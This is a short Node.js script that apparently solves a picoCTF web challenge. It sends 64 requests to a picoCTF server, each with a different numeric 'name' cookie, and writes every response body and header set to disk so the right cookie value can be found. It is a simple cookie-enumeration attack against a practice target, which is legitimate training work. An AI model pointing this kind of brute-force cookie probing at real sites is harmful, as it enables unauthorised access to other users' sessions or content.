
import fs   from 'fs';
import http from 'http';


const get_cookie = (num) => {

	let request = http.request('http://mercury.picoctf.net:54219/check', {
		headers: {
			'Cookie':  'name=' + num,
			'Host':    'mercury.picoctf.net:54219',
			'Referer': 'http://mercury.picoctf.net:54219/'
		},
		method: 'GET'
	}, (response) => {

		const chunks = [];

		response.on('data', (data) => chunks.push(data));
		response.on('end', () => {

			let payload = Buffer.concat(chunks);
			let headers = Buffer.from(JSON.stringify(response.headers, null, '\t'), 'utf8');

			fs.writeFileSync('cookies/' + num + '.payload', payload);
			fs.writeFileSync('cookies/' + num + '.headers', headers);

		});

	});

	request.on('error', (err) => {
		console.error('ERROR requesting cookie #' + num + '!');
	});

	request.end();

};

for (let c = 0, cl = 64; c < cl; c++) {
	get_cookie(c);
}

